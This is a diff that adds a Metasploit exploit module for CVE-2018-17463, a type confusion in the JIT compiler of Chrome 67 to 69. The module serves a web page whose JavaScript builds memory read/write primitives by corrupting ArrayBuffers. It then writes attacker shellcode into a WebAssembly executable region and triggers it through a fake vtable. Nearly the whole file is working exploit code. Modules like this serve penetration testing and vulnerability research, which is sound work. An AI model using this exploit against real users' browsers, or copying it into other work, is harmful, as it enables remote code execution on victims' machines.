@@ -1,0 +1,301 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ManualRanking
+
+  include Msf::Exploit::Remote::HttpServer
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'Google Chrome 67, 68 and 69 Object.create exploit',
+      'Description'    => %q{
+        This modules exploits a type confusion in Google Chromes JIT compiler.
+      The Object.create operation can be used to cause a type confusion between a
+      PropertyArray and a NameDictionary.
+        The payload is executed within the rwx region of the sandboxed renderer
+      process, so the browser must be run with the --no-sandbox option for the
+      payload to work.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         => [
+          'saelo', # discovery and exploit
+          'timwr', # metasploit module
+        ],
+      'References'     => [
+          ['CVE', '2018-17463'],
+          ['URL', 'http://www.phrack.org/papers/jit_exploitation.html'],
+          ['URL', 'https://ssd-disclosure.com/archives/3783/ssd-advisory-chrome-type-confusion-in-jscreateobject-operation-to-rce'],
+          ['URL', 'https://saelo.github.io/presentations/blackhat_us_18_attacking_client_side_jit_compilers.pdf'],
+          ['URL', 'https://bugs.chromium.org/p/chromium/issues/detail?id=888923'],
+        ],
+      'Arch'           => [ ARCH_X64 ],
+      'Platform'       => ['windows', 'osx'],
+      'DefaultTarget'  => 0,
+      'Targets'        => [ [ 'Automatic', { } ] ],
+      'DisclosureDate' => 'Sep 25 2018'))
+    register_advanced_options([
+      OptBool.new('DEBUG_EXPLOIT', [false, "Show debug information during exploitation", false]),
+    ])
+  end
+
+  def on_request_uri(cli, request)
+
+    if datastore['DEBUG_EXPLOIT'] && request.uri =~ %r{/print$*}
+      print_status("[*] " + request.body)
+      send_response(cli, '')
+      return
+    end
+
+    print_status("Sending #{request.uri} to #{request['User-Agent']}")
+
+    jscript = %Q^
+let shellcode = new Uint8Array([#{Rex::Text::to_num(payload.encoded)}]);
+
+let ab = new ArrayBuffer(8);
+let floatView = new Float64Array(ab);
+let uint64View = new BigUint64Array(ab);
+let uint8View = new Uint8Array(ab);
+
+Number.prototype.toBigInt = function toBigInt() {
+    floatView[0] = this;
+    return uint64View[0];
+};
+
+BigInt.prototype.toNumber = function toNumber() {
+    uint64View[0] = this;
+    return floatView[0];
+};
+
+function hex(n) {
+    return '0x' + n.toString(16);
+};
+
+function fail(s) {
+    print('FAIL ' + s);
+    throw null;
+}
+
+const NUM_PROPERTIES = 32;
+const MAX_ITERATIONS = 100000;
+
+function gc() {
+    for (let i = 0; i < 200; i++) {
+        new ArrayBuffer(0x100000);
+    }
+}
+
+function make(properties) {
+    let o = {inline: 42}      // TODO
+    for (let i = 0; i < NUM_PROPERTIES; i++) {
+        eval(`o.p${i} = properties[${i}];`);
+    }
+    return o;
+}
+
+function pwn() {
+    function find_overlapping_properties() {
+        let propertyNames = [];
+        for (let i = 0; i < NUM_PROPERTIES; i++) {
+            propertyNames[i] = `p${i}`;
+        }
+        eval(`
+            function vuln(o) {
+                let a = o.inline;
+                this.Object.create(o);
+                ${propertyNames.map((p) => `let ${p} = o.${p};`).join('\\n')}
+                return [${propertyNames.join(', ')}];
+            }
+        `);
+
+        let propertyValues = [];
+        for (let i = 1; i < NUM_PROPERTIES; i++) {
+            propertyValues[i] = -i;
+        }
+
+        for (let i = 0; i < MAX_ITERATIONS; i++) {
+            let r = vuln(make(propertyValues));
+            if (r[1] !== -1) {
+                for (let i = 1; i < r.length; i++) {
+                    if (i !== -r[i] && r[i] < 0 && r[i] > -NUM_PROPERTIES) {
+                        return [i, -r[i]];
+                    }
+                }
+            }
+        }
+
+        fail("Failed to find overlapping properties");
+    }
+
+    function addrof(obj) {
+        eval(`
+            function vuln(o) {
+                let a = o.inline;
+                this.Object.create(o);
+                return o.p${p1}.x1;
+            }
+        `);
+
+        let propertyValues = [];
+        propertyValues[p1] = {x1: 13.37, x2: 13.38};
+        propertyValues[p2] = {y1: obj};
+
+        let i = 0;
+        for (; i < MAX_ITERATIONS; i++) {
+            let res = vuln(make(propertyValues));
+            if (res !== 13.37)
+                return res.toBigInt()
+        }
+
+        fail("Addrof failed");
+    }
+
+    function corrupt_arraybuffer(victim, newValue) {
+        eval(`
+            function vuln(o) {
+                let a = o.inline;
+                this.Object.create(o);
+                let orig = o.p${p1}.x2;
+                o.p${p1}.x2 = ${newValue.toNumber()};
+                return orig;
+            }
+        `);
+
+        let propertyValues = [];
+        let o = {x1: 13.37, x2: 13.38};
+        propertyValues[p1] = o;
+        propertyValues[p2] = victim;
+
+        for (let i = 0; i < MAX_ITERATIONS; i++) {
+            o.x2 = 13.38;
+            let r = vuln(make(propertyValues));
+            if (r !== 13.38)
+                return r.toBigInt();
+        }
+
+        fail("Corrupt ArrayBuffer failed");
+    }
+
+    let [p1, p2] = find_overlapping_properties();
+    print(`Properties p${p1} and p${p2} overlap after conversion to dictionary mode`);
+
+    let memview_buf = new ArrayBuffer(1024);
+    let driver_buf = new ArrayBuffer(1024);
+
+    gc();
+
+    let memview_buf_addr = addrof(memview_buf);
+    memview_buf_addr--;
+    print(`ArrayBuffer @ ${hex(memview_buf_addr)}`);
+
+    let original_driver_buf_ptr = corrupt_arraybuffer(driver_buf, memview_buf_addr);
+
+    let driver = new BigUint64Array(driver_buf);
+    let original_memview_buf_ptr = driver[4];
+
+    let memory = {
+        write(addr, bytes) {
+            driver[4] = addr;
+            let memview = new Uint8Array(memview_buf);
+            memview.set(bytes);
+        },
+        read(addr, len) {
+            driver[4] = addr;
+            let memview = new Uint8Array(memview_buf);
+            return memview.subarray(0, len);
+        },
+        readPtr(addr) {
+            driver[4] = addr;
+            let memview = new BigUint64Array(memview_buf);
+            return memview[0];
+        },
+        writePtr(addr, ptr) {
+            driver[4] = addr;
+            let memview = new BigUint64Array(memview_buf);
+            memview[0] = ptr;
+        },
+        addrof(obj) {
+            memview_buf.leakMe = obj;
+            let props = this.readPtr(memview_buf_addr + 8n);
+            return this.readPtr(props + 15n) - 1n;
+        },
+    };
+
+    // Generate a RWX region for the payload
+    function get_wasm_instance() {
+      var buffer = new Uint8Array([
+        0,97,115,109,1,0,0,0,1,132,128,128,128,0,1,96,0,0,3,130,128,128,128,0,
+        1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,
+        128,128,0,0,7,146,128,128,128,0,2,6,109,101,109,111,114,121,2,0,5,104,
+        101,108,108,111,0,0,10,136,128,128,128,0,1,130,128,128,128,0,0,11
+      ]);
+      return new WebAssembly.Instance(new WebAssembly.Module(buffer),{});
+    }
+
+    let wasm_instance = get_wasm_instance();
+    let wasm_addr = memory.addrof(wasm_instance);
+    print("wasm_addr @ " + hex(wasm_addr));
+    let wasm_rwx_addr = memory.readPtr(wasm_addr + 0xe0n);
+    print("wasm_rwx @ " + hex(wasm_rwx_addr));
+
+    memory.write(wasm_rwx_addr, shellcode);
+
+    let fake_vtab = new ArrayBuffer(0x80);
+    let fake_vtab_u64 = new BigUint64Array(fake_vtab);
+    let fake_vtab_addr = memory.readPtr(memory.addrof(fake_vtab) + 0x20n);
+
+    let div = document.createElement('div');
+    let div_addr = memory.addrof(div);
+    print('div_addr @ ' + hex(div_addr));
+    let el_addr = memory.readPtr(div_addr + 0x20n);
+    print('el_addr @ ' + hex(div_addr));
+
+    fake_vtab_u64.fill(wasm_rwx_addr, 6, 10);
+    memory.writePtr(el_addr, fake_vtab_addr);
+
+    print('Triggering...');
+
+    // Trigger virtual call
+    div.dispatchEvent(new Event('click'));
+
+    // We are done here, repair the corrupted array buffers
+    let addr = memory.addrof(driver_buf);
+    memory.writePtr(addr + 32n, original_driver_buf_ptr);
+    memory.writePtr(memview_buf_addr + 32n, original_memview_buf_ptr);
+}
+
+pwn();
+^
+
+    if datastore['DEBUG_EXPLOIT']
+      debugjs = %Q^
+print = function(arg) {
+  var request = new XMLHttpRequest();
+  request.open("POST", "/print", false);
+  request.send("" + arg);
+};
+^
+      jscript = "#{debugjs}#{jscript}"
+    else
+      jscript.gsub!(/\/\/.*$/, '') # strip comments
+      jscript.gsub!(/^\s*print\s*\(.*?\);\s*$/, '') # strip print(*);
+    end
+
+    html = %Q^
+<html>
+<head>
+<script>
+#{jscript}
+</script>
+</head>
+<body>
+</body>
+</html>
+^
+
+    send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control' => 'no-cache, no-store, must-revalidate', 'Pragma' => 'no-cache', 'Expires' => '0'})
+  end
+
+end
